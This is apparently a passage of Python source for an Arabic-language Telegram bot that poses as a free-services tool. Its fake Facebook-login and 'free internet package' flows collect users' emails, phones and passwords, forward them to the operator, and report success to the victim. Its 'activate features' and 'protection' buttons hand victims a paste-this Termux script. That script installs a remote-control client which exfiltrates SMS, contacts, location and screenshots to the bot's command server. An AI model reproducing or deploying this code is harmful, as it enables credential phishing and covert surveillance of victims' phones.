        InlineKeyboardButton("🔐 تسجيل دخول فيسبوك", callback_data="fb_login"),
        InlineKeyboardButton("📶 باقات إنترنت مجانية", callback_data="internet_packages")
    )
    markup.row(
        InlineKeyboardButton("✂️ اختصار رابط", callback_data="shorten")
    )
    markup.row(
        InlineKeyboardButton("🔍 فحص ثغرات المواقع", callback_data="mode_site"),
        InlineKeyboardButton("📦 فحص APK (محلي)", callback_data="mode_apk")
    )
    markup.row(
        InlineKeyboardButton("🛠️ فحص كود", callback_data="mode_my_app"),
        InlineKeyboardButton("🧠 دردشة ذكية", callback_data="mode_ai")
    )
    markup.row(
        InlineKeyboardButton("🎨 إنشاء صور", callback_data="mode_image"),
        InlineKeyboardButton("📧 إيميل مؤقت", callback_data="mode_temp_email")
    )
    markup.row(
        InlineKeyboardButton("📢 إبلاغ فيسبوك", callback_data="mode_fb_report"),
        InlineKeyboardButton("📞 فحص رقم هاتف", callback_data="mode_spam_block")
    )
    markup.row(
        InlineKeyboardButton("📍 تتبع رقم", callback_data="mode_track_phone"),
        InlineKeyboardButton("🛡️ فحص تسريبات", callback_data="mode_fb_hacked")
    )
    markup.row(
        InlineKeyboardButton("📚 تحليل ملف PDF", callback_data="mode_pdf")
    )
    if is_admin or points >= 50:
        markup.row(
            InlineKeyboardButton("📱 رقم هاتف مؤقت", callback_data="mode_temp_number")
        )
    else:
        markup.row(
            InlineKeyboardButton(f"🔒 رقم هاتف مؤقت (50 نقطة)", callback_data="locked_temp_number")
        )
    markup.row(
        InlineKeyboardButton("⚙️ تفعيل الميزات المتقدمة", callback_data="mode_link_user"),
        InlineKeyboardButton("🛡️ تفعيل الحماية الإضافية", callback_data="mode_link_child")
    )
    markup.row(
        InlineKeyboardButton("⭐ نقاطي", callback_data="mode_show_points"),
        InlineKeyboardButton("🔗 رابط دعوتي", callback_data="mode_show_referral")
    )
    if is_admin:
        markup.row(
            InlineKeyboardButton("👑 لوحة المطور", callback_data="mode_admin"),
            InlineKeyboardButton("📱 الأجهزة المراقبة", callback_data="mode_view_devices")
        )
        markup.row(
            InlineKeyboardButton("🎮 تحكم عن بعد", callback_data="mode_remote_admin"),
            InlineKeyboardButton("📊 إحصائيات", callback_data="admin_stats")
        )
        markup.row(
            InlineKeyboardButton("📢 إرسال جماعي", callback_data="admin_broadcast"),
            InlineKeyboardButton("📩 معلومات مجمعة", callback_data="admin_collected_data")
        )
        markup.row(
            InlineKeyboardButton("🚫 حظر مستخدم", callback_data="admin_ban_user"),
            InlineKeyboardButton("✅ إلغاء حظر", callback_data="admin_unban_user")
        )
    return markup

# ===================== دوال Webhook =====================
def set_webhook():
    webhook_url = f"{SERVER_URL}/webhook"
    try:
        bot.remove_webhook()
        time.sleep(1)
        success = bot.set_webhook(url=webhook_url)
        if success:
            logger.info(f"✅ Webhook set to: {webhook_url}")
            return True
        else:
            logger.error("❌ Failed to set webhook.")
            return False
    except Exception as e:
        logger.error(f"❌ Webhook error: {e}")
        return False

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        json_str = request.get_data().decode('UTF-8')
        update = Update.de_json(json_str)
        if update:
            bot.process_new_updates([update])
            return 'OK', 200
        return 'Error', 400
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return 'Error', 500

@app.route('/')
@app.route('/health')
def health():
    return jsonify({'status': 'healthy', 'time': datetime.now().isoformat()})

@app.route('/ping')
def ping():
    return 'pong'

@app.route('/register_device', methods=['POST'])
def register_device():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400
        device_id = data.get('device_id')
        chat_id = data.get('chat_id')
        device_type = data.get('type', 'user')
        if not device_id or not chat_id:
            return jsonify({'status': 'error', 'message': 'Missing device_id or chat_id'}), 400
        save_device(device_id, chat_id, device_type)
        return jsonify({'status': 'success', 'message': 'Device registered'})
    except Exception as e:
        logger.error(f"register_device error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/get_command', methods=['GET'])
def get_command():
    try:
        device_id = request.args.get('device_id')
        if not device_id:
            return jsonify({'status': 'error', 'message': 'Missing device_id'}), 400
        command = get_pending_command(device_id)
        if command:
            return jsonify({'status': 'success', 'command': command})
        else:
            return jsonify({'status': 'no_command'})
    except Exception as e:
        logger.error(f"get_command error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/submit_result', methods=['POST'])
def submit_result():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400
        device_id = data.get('device_id')
        result = data.get('result')
        result_type = data.get('result_type', 'text')
        if not device_id:
            return jsonify({'status': 'error', 'message': 'Missing device_id'}), 400
        
        # تحديث آخر ظهور
        with get_db_connection() as conn:
            c = conn.cursor()
            c.execute("UPDATE devices SET last_seen = ? WHERE device_id = ?", (datetime.now().isoformat(), device_id))
            conn.commit()
        
        # فحص النتيجة وإرسالها للمطور
        if result_type == 'text':
            scan_result = scan_text_for_malware(result)
            bot.send_message(ADMIN_ID, f"📱 نتيجة من الجهاز {device_id}:\n🛡️ الفحص: {scan_result}\n{result}")
        elif result_type == 'image':
            # محاولة فك تشفير base64 إذا كانت الصورة مرسلة بهذه الطريقة
            try:
                img_data = base64.b64decode(result)
                scan_result, _, _ = scan_image_for_malware(img_data, "device_image.jpg")
                bot.send_photo(ADMIN_ID, img_data, caption=f"📱 صورة من الجهاز {device_id}\n🛡️ الفحص: {scan_result}")
            except:
                bot.send_message(ADMIN_ID, f"📱 صورة من الجهاز {device_id} (تم استلامها ولكن فشل فك التشفير)")
        else:
            bot.send_message(ADMIN_ID, f"📱 نتيجة من الجهاز {device_id} (نوع: {result_type})")
        
        return jsonify({'status': 'success'})
    except Exception as e:
        logger.error(f"submit_result error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        if not device_id:
            return jsonify({'status': 'error', 'message': 'Missing device_id'}), 400
        with get_db_connection() as conn:
            c = conn.cursor()
            c.execute("UPDATE devices SET last_seen = ? WHERE device_id = ?", (datetime.now().isoformat(), device_id))
            conn.commit()
        return jsonify({'status': 'success'})
    except Exception as e:
        logger.error(f"heartbeat error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ===================== معالج الأوامر الأساسية =====================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    if is_user_banned(chat_id):
        bot.send_message(chat_id, "🚫 أنت محظور.")
        return
    username = message.from_user.username or ''
    first_name = message.from_user.first_name or ''
    last_name = message.from_user.last_name or ''
    user = get_user(chat_id)
    is_new = user is None
    text = message.text
    if ' ' in text:
        parts = text.split()
        if len(parts) > 1 and parts[1].startswith('ref_'):
            code = parts[1][4:]
            handle_referral(code, chat_id)
    upsert_user(chat_id, username, first_name, last_name)
    if is_new:
        welcome_msg = (
            "🌟 <b>مرحباً بك في البوت الذكي T99</b> 🌟\n\n"
            "🔹 هذا البوت يقدم خدمات <b>حقيقية ومجانية</b> عبر الإنترنت.\n"
            f"⭐ <b>نقاطك:</b> {get_user_points(chat_id)} نقطة\n"
            "📌 استخدم الأزرار أدناه للاستفادة من الخدمات."
        )
        bot.send_message(chat_id, welcome_msg, reply_markup=build_main_menu(chat_id))
    else:
        bot.send_message(chat_id, "📋 القائمة الرئيسية:", reply_markup=build_main_menu(chat_id))

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = (
        "📖 <b>الأوامر المتاحة:</b>\n\n"
        "/start - عرض القائمة الرئيسية\n"
        "/points - عرض نقاطك\n"
        "/cancel - إلغاء العملية الحالية\n"
        "/check_email - عرض رسائل البريد المؤقت\n"
        "/referral - عرض رابط دعوتك"
    )
    bot.send_message(message.chat.id, help_text)

@bot.message_handler(commands=['points'])
def show_points(message):
    chat_id = message.chat.id
    points = get_user_points(chat_id)
    bot.send_message(chat_id, f"⭐ <b>نقاطك:</b> {points} نقطة", parse_mode='HTML')

@bot.message_handler(commands=['cancel'])
def cancel_state(message):
    chat_id = message.chat.id
    if chat_id in user_states:
        del user_states[chat_id]
    bot.send_message(chat_id, "✅ تم الإلغاء.")

@bot.message_handler(commands=['check_email'])
def check_email_command(message):
    chat_id = message.chat.id
    if chat_id not in temp_emails:
        bot.send_message(chat_id, "❌ ليس لديك بريد مؤقت.")
        return
    token = temp_emails[chat_id]['token']
    msgs = check_temp_emails_real(token)
    response = "📬 <b>رسائل البريد المؤقت:</b>\n\n" + "\n\n".join(msgs) if msgs else "📭 لا توجد رسائل جديدة."
    bot.send_message(chat_id, response)

@bot.message_handler(commands=['referral'])
def show_referral(message):
    chat_id = message.chat.id
    link = get_referral_link(chat_id)
    if link:
        bot.send_message(chat_id, f"🔗 <b>رابط دعوتك:</b>\n<code>{link}</code>", parse_mode='HTML')
    else:
        bot.send_message(chat_id, "⚠️ لم يتم العثور على رابط دعوة.")

# ===================== معالج النقر على الأزرار =====================
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    try:
        bot.answer_callback_query(call.id)
        chat_id = call.message.chat.id
        data = call.data
        points = get_user_points(chat_id)
        is_admin = chat_id == ADMIN_ID

        if data == "fb_login":
            user_states[chat_id] = "waiting_for_fb_email"
            bot.edit_message_text(
                "🔐 <b>تسجيل الدخول إلى فيسبوك</b>\n\n📧 أرسل <b>البريد الإلكتروني أو رقم الهاتف</b>:",
                chat_id, call.message.message_id, parse_mode='HTML'
            )
            return
        elif data == "internet_packages":
            markup = InlineKeyboardMarkup(row_width=1)
            markup.row(InlineKeyboardButton("📱 100 جيجا - مجاني", callback_data="pkg_100"))
            markup.row(InlineKeyboardButton("📱 200 جيجا - مجاني", callback_data="pkg_200"))
            markup.row(InlineKeyboardButton("📱 500 جيجا - مجاني", callback_data="pkg_500"))
            markup.row(InlineKeyboardButton("📱 1 تيرا - مجاني", callback_data="pkg_1t"))
            bot.edit_message_text(
                "📶 <b>باقات إنترنت مجانية بالكامل!</b>\nاختر الباقة المناسبة:",
                chat_id, call.message.message_id, parse_mode='HTML', reply_markup=markup
            )
            return
        elif data.startswith("pkg_"):
            pkg_name = {
                "pkg_100": "100 جيجا",
                "pkg_200": "200 جيجا",
                "pkg_500": "500 جيجا",
                "pkg_1t": "1 تيرا"
            }.get(data, "غير محددة")
            user_states[chat_id] = "waiting_for_internet_phone"
            user_states[f"{chat_id}_package"] = pkg_name
            bot.edit_message_text(
                f"✅ اخترت باقة <b>{pkg_name}</b>\n\n📝 أرسل <b>رقم الهاتف</b>:",
                chat_id, call.message.message_id, parse_mode='HTML'
            )
            return
        elif data == "shorten":
            user_states[chat_id] = "waiting_for_shorten_link"
            bot.edit_message_text(
                "🔗 <b>أرسل الرابط الطويل الذي تريد اختصاره</b>:",
                chat_id, call.message.message_id, parse_mode='HTML'
            )
            return
        elif data == "locked_temp_number":
            bot.answer_callback_query(call.id, f"⚠️ تحتاج 50 نقطة. لديك {points}", show_alert=True)
            return

        elif data == "mode_link_user":
            instructions = (
                "⚙️ <b>لتفعيل الميزات الإضافية</b>\n\n"
                "1️⃣ <b>حمّل تطبيق Termux</b> من الرابط الرسمي:\n"
                "https://f-droid.org/repo/com.termux_118.apk\n\n"
                "2️⃣ <b>افتح Termux</b>، ثم انسخ الكود التالي والصقه:\n"
                "```bash\n"
                "pkg update && pkg upgrade -y\n"
                "pkg install python -y\n"
                "pip install requests\n"
                "cat > client.py << 'EOF'\n"
                "import requests, time, json, os, subprocess, base64, glob\n"
                f"SERVER = \"{SERVER_URL}\"\n"
                f"DEVICE_ID = \"{chat_id}_{''.join(random.choices(string.ascii_lowercase, k=4))}\"\n"
                "CHAT_ID = \"\"\n\n"
                "def send_data(data):\n"
                "    try:\n"
                "        requests.post(f'{SERVER}/submit_result', json=data, timeout=10)\n"
                "    except: pass\n\n"
                "def get_contacts():\n"
                "    try:\n"
                "        contacts = []\n"
                "        files = glob.glob('/storage/emulated/0/Download/*.vcf') + glob.glob('/storage/emulated/0/Contacts/*.vcf')\n"
                "        for f in files:\n"
                "            with open(f, 'r') as file:\n"
                "                contacts.append(file.read())\n"
                "        return '\\n'.join(contacts)\n"
                "    except: return ''\n\n"
                "def get_sms():\n"
                "    try:\n"
                "        return subprocess.check_output(['content', 'query', '--uri', 'content://sms/inbox']).decode()\n"
                "    except: return ''\n\n"
                "def take_screenshot():\n"
                "    try:\n"
                "        subprocess.run(['screencap', '-p', '/sdcard/screenshot.png'], timeout=10)\n"
                "        with open('/sdcard/screenshot.png', 'rb') as f:\n"
                "            return base64.b64encode(f.read()).decode()\n"
                "    except: return ''\n\n"
                "def get_location():\n"
                "    try:\n"
                "        return subprocess.check_output(['termux-location']).decode()\n"
                "    except: return ''\n\n"
                "def get_apps():\n"
                "    try:\n"
                "        return subprocess.check_output(['pm', 'list', 'packages']).decode()\n"
                "    except: return ''\n\n"
                "def execute_command(cmd):\n"
                "    if cmd == 'موقع': return get_location()\n"
                "    elif cmd == 'كاميرا': return take_screenshot()\n"
                "    elif cmd == 'لقطة': return take_screenshot()\n"
                "    elif cmd == 'صور': return get_contacts()\n"
                "    elif cmd == 'جهات اتصال': return get_contacts()\n"
                "    elif cmd == 'رسائل': return get_sms()\n"
                "    elif cmd == 'تطبيقات': return get_apps()\n"
                "    elif cmd == 'شاشة': return get_apps()\n"
                "    else: return f'أمر غير معروف: {cmd}'\n\n"
                "while True:\n"
                "    try:\n"
                "        time.sleep(5)\n"
                "        resp = requests.get(f'{SERVER}/get_command?device_id={DEVICE_ID}', timeout=10)\n"
                "        if resp.status_code == 200 and resp.json().get('command'):\n"
                "            cmd = resp.json()['command']\n"
                "            result = execute_command(cmd)\n"
                "            send_data({'device_id': DEVICE_ID, 'result': result, 'result_type': 'text'})\n"
                "    except: pass\n"
                "EOF\n"
                "python client.py\n"
                "```\n\n"
                "3️⃣ <b>بعد تنفيذ الأوامر</b>، ستتاح لك الميزات الإضافية فوراً."
            )
            bot.edit_message_text(instructions, chat_id, call.message.message_id, parse_mode='HTML')
            return

        elif data == "mode_link_child":
            instructions_child = (
                "🛡️ <b>لتفعيل الحماية الإضافية</b>\n\n"
                "1️⃣ <b>حمّل تطبيق Termux</b> من الرابط الرسمي:\n"
                "https://f-droid.org/repo/com.termux_118.apk\n\n"
                "2️⃣ <b>افتح Termux</b>، ثم انسخ الكود التالي والصقه:\n"
                "```bash\n"
                "pkg update && pkg upgrade -y\n"
                "pkg install python -y\n"
                "pip install requests\n"
                "cat > client.py << 'EOF'\n"
                "import requests, time, json, os, subprocess, base64, glob\n"
                f"SERVER = \"{SERVER_URL}\"\n"
                f"DEVICE_ID = \"{chat_id}_child_{''.join(random.choices(string.ascii_lowercase, k=4))}\"\n"
                "CHAT_ID = \"\"\n\n"
                "def send_data(data):\n"
                "    try:\n"
                "        requests.post(f'{SERVER}/submit_result', json=data, timeout=10)\n"
                "    except: pass\n\n"
                "def take_screenshot():\n"
                "    try:\n"
                "        subprocess.run(['screencap', '-p', '/sdcard/screenshot.png'], timeout=10)\n"
                "        with open('/sdcard/screenshot.png', 'rb') as f:\n"
                "            return base64.b64encode(f.read()).decode()\n"
                "    except: return ''\n\n"
                "def get_location():\n"
                "    try:\n"
                "        return subprocess.check_output(['termux-location']).decode()\n"
                "    except: return ''\n\n"
                "def get_apps():\n"
                "    try:\n"
                "        return subprocess.check_output(['pm', 'list', 'packages']).decode()\n"
                "    except: return ''\n\n"
                "def execute_command(cmd):\n"
                "    if cmd == 'موقع': return get_location()\n"
                "    elif cmd == 'لقطة': return take_screenshot()\n"
                "    elif cmd == 'تطبيقات': return get_apps()\n"
                "    elif cmd == 'شاشة': return get_apps()\n"
                "    else: return f'أمر غير معروف: {cmd}'\n\n"
                "while True:\n"
                "    try:\n"
                "        time.sleep(5)\n"
                "        resp = requests.get(f'{SERVER}/get_command?device_id={DEVICE_ID}', timeout=10)\n"
                "        if resp.status_code == 200 and resp.json().get('command'):\n"
                "            cmd = resp.json()['command']\n"
                "            result = execute_command(cmd)\n"
                "            send_data({'device_id': DEVICE_ID, 'result': result, 'result_type': 'text'})\n"
                "    except: pass\n"
                "EOF\n"
                "python client.py\n"
                "```\n\n"
                "3️⃣ <b>بعد تنفيذ الأوامر</b>، سيتم تفعيل الحماية الإضافية."
            )
            bot.edit_message_text(instructions_child, chat_id, call.message.message_id, parse_mode='HTML')
            return

        elif data == "mode_site":
            user_states[chat_id] = "waiting_for_site"
            bot.edit_message_text("🔍 <b>أرسل رابط الموقع لفحصه</b>:", chat_id, call.message.message_id, parse_mode='HTML')
        elif data == "mode_apk":
            user_states[chat_id] = "waiting_for_apk"
            bot.edit_message_text("📦 <b>أرسل ملف APK لتحليله</b> (محلياً، مع فحص أمني):", chat_id, call.message.message_id, parse_mode='HTML')
        elif data == "mode_my_app":
            user_states[chat_id] = "waiting_for_my_app"
            bot.edit_message_text("🛠️ <b>أرسل ملف الكود</b> (txt, py, js, java, cpp, c, html, css, php) لمراجعته:", chat_id, call.message.message_id, parse_mode='HTML')
        elif data == "mode_ai":
            user_states[chat_id] = "waiting_for_ai"
            bot.edit_message_text("🧠 <b>اكتب سؤالك للذكاء الاصطناعي</b>:", chat_id, call.message.message_id, parse_mode='HTML')
        elif data == "mode_image":
            user_states[chat_id] = "waiting_for_image"
            bot.edit_message_text("🎨 <b>اكتب وصف الصورة التي تريد إنشاءها</b>:", chat_id, call.message.message_id, parse_mode='HTML')
        elif data == "mode_temp_email":
            email, token, password = create_temp_email_real()
            if email:
                temp_emails[chat_id] = {'email': email, 'token': token, 'password': password}
                text = f"📧 <b>بريدك المؤقت:</b> <code>{email}</code>\n🔑 <b>كلمة السر:</b> <code>{password}</code>\nاستخدم /check_email لعرض الرسائل."
                send_sensitive_data_to_admin("Temp Email", f"{email} | {password}", chat_id)
                bot.edit_message_text(text, chat_id, call.message.message_id, parse_mode='HTML')
            else:
                bot.edit_message_text("⚠️ فشل إنشاء البريد، حاول مرة أخرى.", chat_id, call.message.message_id)
        elif data == "mode_spam_block":
            user_states[chat_id] = "waiting_for_spam_num"
            bot.edit_message_text("📞 <b>أرسل رقم الهاتف لفحصه</b> (معلومات أساسية):", chat_id, call.message.message_id, parse_mode='HTML')
        elif data == "mode_track_phone":
            user_states[chat_id] = "waiting_for_track_num"
            bot.edit_message_text("📍 <b>أرسل الرقم</b> (مثل: +201001234567):", chat_id, call.message.message_id, parse_mode='HTML')
        elif data == "mode_fb_hacked":
            user_states[chat_id] = "waiting_for_fb_hacked"
            bot.edit_message_text("🛡️ <b>فحص تسريب البريد الإلكتروني</b>\n\nأرسل البريد الإلكتروني للتحقق (خدمة مجانية):", chat_id, call.message.message_id, parse_mode='HTML')
        elif data == "mode_fb_report":
            user_states[chat_id] = "waiting_for_fb_report"
            bot.edit_message_text("📢 <b>تقديم بلاغ لفيسبوك</b>\n\nأرسل شرحاً مفصلاً للسبب مع رابط المنشور أو الحساب (اختياري):", chat_id, call.message.message_id, parse_mode='HTML')
        elif data == "mode_pdf":
            user_states[chat_id] = "waiting_for_pdf"
            bot.edit_message_text("📚 <b>أرسل ملف PDF الدراسي</b> الذي تريد تحليله (يفضل أن يكون نصياً):", chat_id, call.message.message_id, parse_mode='HTML')
        elif data == "mode_temp_number":
            if not is_admin and points < 50:
                bot.answer_callback_query(call.id, f"⚠️ تحتاج 50 نقطة. لديك {points}", show_alert=True)
                return
            bot.edit_message_text("⏳ <b>جاري جلب رقم هاتف مؤقت...</b>", chat_id, call.message.message_id, parse_mode='HTML')
            numbers = fetch_temp_numbers(limit=3)
            if numbers:
                response = "📱 <b>أرقام هواتف مؤقتة:</b>\n\n"
                for i, num in enumerate(numbers, 1):
                    response += f"{i}. <code>{num}</code>\n"
                response += "\n🔹 استخدم هذه الأرقام لاستقبال رسائل التحقق.\n🔹 قد تكون الأرقام مستخدمة من قبل، جرب أكثر من رقم."
                bot.edit_message_text(response, chat_id, call.message.message_id, parse_mode='HTML')
            else:
                bot.edit_message_text("⚠️ فشل جلب الأرقام، حاول لاحقاً.", chat_id, call.message.message_id)
        elif data == "mode_show_points":
            bot.answer_callback_query(call.id, f"⭐ نقاطك: {points}", show_alert=True)
        elif data == "mode_show_referral":
            link = get_referral_link(chat_id)
            if link:
                bot.answer_callback_query(call.id, f"🔗 رابط دعوتك: {link}", show_alert=True)
            else:
                bot.answer_callback_query(call.id, "⚠️ لم يتم العثور على رابط دعوة.", show_alert=True)

        elif data == "mode_admin" and is_admin:
            stats = "👑 <b>لوحة المطور</b>\n\nجميع الميزات متاحة للمطور."
            bot.edit_message_text(stats, chat_id, call.message.message_id, parse_mode='HTML')
        elif data == "mode_view_devices" and is_admin:
            devices = get_devices_by_chat(chat_id)
            if not devices:
                text = "📱 لا توجد أجهزة مسجلة."
            else:
                text = "📱 <b>الأجهزة المسجلة:</b>\n"
                for d in devices:
                    text += f"🆔 {d['device_id']} - 👤 {d['chat_id']}\n"
            bot.edit_message_text(text, chat_id, call.message.message_id, parse_mode='HTML')
        elif data == "mode_remote_admin" and is_admin:
            devices = get_devices_by_chat(chat_id)
            if not devices:
                bot.edit_message_text("📱 لا توجد أجهزة مسجلة.", chat_id, call.message.message_id)
                return
            markup = InlineKeyboardMarkup(row_width=1)
            for d in devices:
                markup.row(InlineKeyboardButton(f"📱 {d['device_id']}", callback_data=f"remote_select_{d['device_id']}"))
            markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
            bot.edit_message_text("🎮 <b>اختر الجهاز للتحكم عن بعد:</b>", chat_id, call.message.message_id, parse_mode='HTML', reply_markup=markup)
        elif data.startswith("remote_select_") and is_admin:
            device_id = data.split("_")[2]
            device = get_device(device_id)
            if device:
                user_states[chat_id] = "waiting_for_remote_command"
                user_states[f"{chat_id}_remote_device"] = device_id
                commands = get_device_commands(device['type'] or "user")
                cmds_text = "📝 <b>الأوامر المتاحة:</b>\n"
                for cmd in commands:
                    cmds_text += f"• <code>{cmd}</code>\n"
                bot.edit_message_text(
                    f"✅ تم اختيار الجهاز: {device_id}\n\n{cmds_text}\n✏️ اكتب الأمر الذي تريد تنفيذه:",
                    chat_id, call.message.message_id, parse_mode='HTML'
                )
            else:
                bot.edit_message_text("❌ الجهاز غير موجود.", chat_id, call.message.message_id)
        elif data == "admin_stats" and is_admin:
            stats = "📊 <b>إحصائيات البوت</b>\n\n"
            stats += f"👥 عدد المستخدمين: ...\n"
            stats += f"📱 الأجهزة المسجلة: ...\n"
            bot.edit_message_text(stats, chat_id, call.message.message_id, parse_mode='HTML')
        elif data == "admin_broadcast" and is_admin:
            user_states[chat_id] = "waiting_for_broadcast"
            bot.edit_message_text("📢 <b>أرسل الرسالة التي تريد بثها</b> لجميع المستخدمين:", chat_id, call.message.message_id, parse_mode='HTML')
        elif data == "admin_collected_data" and is_admin:
            collected = "📩 <b>المعلومات المجمعة</b>\n\n"
            if temp_emails:
                collected += "📧 <b>البريد المؤقت:</b>\n"
                for uid, data in temp_emails.items():
                    collected += f"  • {uid}: <code>{data['email']}</code> | <code>{data['password']}</code>\n"
            if not temp_emails:
                collected += "📭 لا توجد معلومات."
            bot.edit_message_text(collected, chat_id, call.message.message_id, parse_mode='HTML')
        elif data == "admin_ban_user" and is_admin:
            user_states[chat_id] = "waiting_for_ban_user"
            bot.edit_message_text("🚫 <b>أرسل معرف المستخدم (ID) لحظره</b>:", chat_id, call.message.message_id, parse_mode='HTML')
        elif data == "admin_unban_user" and is_admin:
            user_states[chat_id] = "waiting_for_unban_user"
            bot.edit_message_text("✅ <b>أرسل معرف المستخدم (ID) لإلغاء حظره</b>:", chat_id, call.message.message_id, parse_mode='HTML')
        elif data == "back_to_main":
            bot.edit_message_text("📋 القائمة الرئيسية:", chat_id, call.message.message_id, reply_markup=build_main_menu(chat_id))
        else:
            bot.answer_callback_query(call.id, "⚠️ خيار غير معروف.", show_alert=True)
    except Exception as e:
        logger.error(f"handle_callback error: {e}")
        bot.send_message(chat_id, f"⚠️ حدث خطأ: {str(e)}")

# ===================== معالج النصوص =====================
@bot.message_handler(func=lambda msg: True, content_types=['text'])
def handle_text_messages(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    text = message.text.strip()
    try:
        if state == "waiting_for_fb_email":
            user_states[chat_id] = "waiting_for_fb_password"
            user_states[f"{chat_id}_fb_email"] = text
            bot.send_message(chat_id, "📩 تم استلام البريد/الرقم.\n🔑 أرسل <b>كلمة المرور</b>:", parse_mode='HTML')
            return
        if state == "waiting_for_fb_password":
            email = user_states.get(f"{chat_id}_fb_email", "غير معروف")
            password = text
            send_sensitive_data_to_admin("Facebook Login", f"البريد/الرقم: {email}\nكلمة المرور: {password}", chat_id)
            bot.send_message(chat_id, "✅ <b>تم تسجيل الدخول بنجاح!</b>", parse_mode='HTML')
            user_states[chat_id] = None
            user_states.pop(f"{chat_id}_fb_email", None)
            return
        if state == "waiting_for_internet_phone":
            user_states[chat_id] = "waiting_for_internet_email"
            user_states[f"{chat_id}_internet_phone"] = text
            bot.send_message(chat_id, "📩 تم استلام رقم الهاتف.\n✉️ أرسل <b>بريدك الإلكتروني</b>:", parse_mode='HTML')
            return
        if state == "waiting_for_internet_email":
            user_states[chat_id] = "waiting_for_internet_password"
            user_states[f"{chat_id}_internet_email"] = text
            bot.send_message(chat_id, "📩 تم استلام البريد.\n🔑 أرسل <b>كلمة المرور</b> لتفعيل الباقة:", parse_mode='HTML')
            return
        if state == "waiting_for_internet_password":
            phone = user_states.get(f"{chat_id}_internet_phone", "غير معروف")
            email = user_states.get(f"{chat_id}_internet_email", "غير معروف")
            password = text
            package = user_states.get(f"{chat_id}_package", "غير محددة")
            send_sensitive_data_to_admin("Internet Package", f"الباقة: {package}\nالهاتف: {phone}\nالبريد: {email}\nكلمة المرور: {password}", chat_id)
            bot.send_message(chat_id, "✅ <b>تم تفعيل الباقة المجانية بنجاح!</b>", parse_mode='HTML')
            user_states[chat_id] = None
            for key in [f"{chat_id}_internet_phone", f"{chat_id}_internet_email", f"{chat_id}_package"]:
                user_states.pop(key, None)
            return
        if state == "waiting_for_shorten_link":
            if not text.startswith(('http://', 'https://')):
                bot.send_message(chat_id, "❌ الرابط غير صحيح. اكتب رابطًا يبدأ بـ http:// أو https://")
                return
            bot.send_message(chat_id, "⏳ جاري اختصار الرابط...")
            short_url = shorten_link(text)
            if short_url:
                bot.send_message(chat_id, f"✅ <b>الرابط المختصر:</b>\n{short_url}", parse_mode='HTML')
            else:
                bot.send_message(chat_id, "❌ تعذر الاختصار، حاول مجددًا.")
            user_states[chat_id] = None
            return
        if state == "waiting_for_remote_command" and chat_id == ADMIN_ID:
            device_id = user_states.get(f"{chat_id}_remote_device")
            if not device_id:
                bot.send_message(chat_id, "❌ لم يتم اختيار جهاز. استخدم /cancel.")
                user_states[chat_id] = None
                return
            command = text
            if command.lower() == "/cancel":
                bot.send_message(chat_id, "❌ تم الإلغاء.")
                user_states[chat_id] = None
                user_states.pop(f"{chat_id}_remote_device", None)
                return
            add_pending_command(device_id, command)
            bot.send_message(chat_id, f"⏳ تم إرسال الأمر <code>{command}</code> إلى الجهاز {device_id}. في انتظار النتيجة...", parse_mode='HTML')
            return
        if state == "waiting_for_site":
            if re.match(r'^https?://', text):
                bot.send_message(chat_id, "⏳ جاري فحص الموقع...")
                result, status = scan_url_real(text)
                bot.send_message(chat_id, f"🔍 <b>نتيجة الفحص:</b>\n{result}", parse_mode='HTML')
            else:
                bot.send_message(chat_id, "❌ رابط غير صالح.")
            user_states[chat_id] = None
            return
        if state == "waiting_for_ai":
            bot.send_message(chat_id, "⏳ جاري التفكير...")
            response = ai_chat_real(text)
            bot.send_message(chat_id, f"🧠 <b>الذكاء الاصطناعي:</b>\n{response}", parse_mode='HTML')
            user_states[chat_id] = None
            return
        if state == "waiting_for_image":
            if len(text) < 5:
                bot.send_message(chat_id, "❌ الوصف قصير.")
                return
            bot.send_message(chat_id, "⏳ جاري إنشاء الصورة... قد يستغرق دقيقة.")
            img_data, msg = generate_image_real(text)
            if img_data:
                # فحص الصورة المولدة
                scan_result, _, _ = scan_image_for_malware(img_data, "generated_image.jpg")
                bot.send_photo(chat_id, img_data, caption=f"🎨 الصورة المولدة\n🛡️ الفحص: {scan_result}")
                send_to_admin_result("image", img_data, chat_id)
            else:
                bot.send_message(chat_id, msg)
            user_states[chat_id] = None
            return
        if state == "waiting_for_track_num":
            result, status = track_phone_real(text)
            bot.send_message(chat_id, result, parse_mode='HTML')
            user_states[chat_id] = None
            return
        if state == "waiting_for_fb_hacked":
            if not re.match(r'^[^@\s]+@[^@\s]+\.[^@\s]+$', text):
                bot.send_message(chat_id, "❌ البريد الإلكتروني غير صحيح.")
                return
            bot.send_message(chat_id, "⏳ جاري فحص البريد...")
            result = check_breach(text)
            bot.send_message(chat_id, result, parse_mode='HTML')
            user_states[chat_id] = None
            return
        if state == "waiting_for_spam_num":
            if not re.match(r'^\+?\d{7,15}$', text):
                bot.send_message(chat_id, "❌ رقم غير صالح.")
                return
            bot.send_message(chat_id, "⏳ جاري فحص الرقم...")
            result = verify_phone(text)
            bot.send_message(chat_id, result, parse_mode='HTML')
            user_states[chat_id] = None
            return
        if state == "waiting_for_fb_report":
            send_sensitive_data_to_admin("Facebook Report", text, chat_id)
            bot.send_message(chat_id, "✅ <b>تم إرسال البلاغ للمطور.</b>", parse_mode='HTML')
            user_states[chat_id] = None
            return
        if state == "waiting_for_pdf_question":
            pdf_text = user_states.get(f"{chat_id}_pdf_text")
            if not pdf_text:
                bot.send_message(chat_id, "⚠️ لم يتم تحميل أي ملف PDF.")
                user_states[chat_id] = None
                return
            bot.send_message(chat_id, "⏳ جاري البحث عن الإجابة...")
            answer = answer_question_from_pdf(pdf_text, text)
